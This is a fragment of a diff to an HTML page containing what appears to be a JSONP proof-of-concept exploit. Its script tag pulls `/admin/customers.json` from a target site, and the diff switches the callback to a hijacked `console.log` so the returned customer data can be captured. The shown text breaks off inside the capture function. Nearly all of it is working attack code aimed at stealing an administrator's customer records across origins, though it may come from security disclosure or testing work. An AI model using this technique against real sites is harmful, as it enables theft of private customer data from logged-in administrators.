@@ -3,7 +3,7 @@
 <script>
 var leak = function(){
   x = document.createElement('script')
-  x.src=document.getElementById('base').value+"/admin/customers.json?callback=leak_issues"
+  x.src=document.getElementById('base').value+"/admin/customers.json?callback=console.log"
   document.body.appendChild(x)
 }
 var console = {log:function(g){
